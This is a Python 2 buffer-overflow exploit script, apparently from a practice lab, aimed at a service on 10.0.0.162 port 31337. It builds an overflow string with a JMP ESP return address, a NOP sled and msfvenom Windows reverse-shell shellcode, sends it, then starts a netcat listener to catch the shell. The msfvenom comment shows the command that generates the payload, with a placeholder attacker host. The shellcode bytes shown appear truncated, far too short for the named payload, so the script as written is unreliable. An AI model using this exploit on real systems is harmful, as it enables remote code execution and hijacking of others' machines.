#!/usr/bin/env python2
import socket
import subprocess
import time
#setup the ip and port we are connecting to
RHOST = "10.0.0.162"
RPORT = 31337
lport = raw_input("Enter the port to listen with netcat: ")
#msfvenom -p windows/shell_reverse_tcp LHOST=KALIIP LPORT=KALIPORT -f c -b "\x00\x0a\x0d\x20\x09\x26\x3b\x5c\x2f"
shellcode=("\xba\x9e\xaa\xb2\x3d\xd9\xe1\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x5b\xae\x50\xc8\x9f"
"\x47\x16\x33\x5f\x98\x77\xbd\xba\xa9\xb7\xd9\xcf\x9a\x07"
"\xcb\x76\x30\xbc\xce\x33\xf6\x2d\xa3\x2c\x93\x51\x10\x4c")

#create a tcp connection(socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
#build a happy little message followed by a newline
buf = ""
buf += "A"*146              #ToCrash
buf += "\xc3\x14\x04\x08"   #JMP ESP you get using !mona jmp -r esp in immunity debugger.
buf += "\x90"*30            #NOPS
buf += shellcode            #PAYLOAD
buf += "\n"                 #Hit Enter
#send the happy little message down the socket
s.send(buf)
# Start netcat listener in background in the same terminal
print("[*] Starting netcat listener on port %s..." % lport)
subprocess.call(["nc", "-lvnp", lport])
s.close()
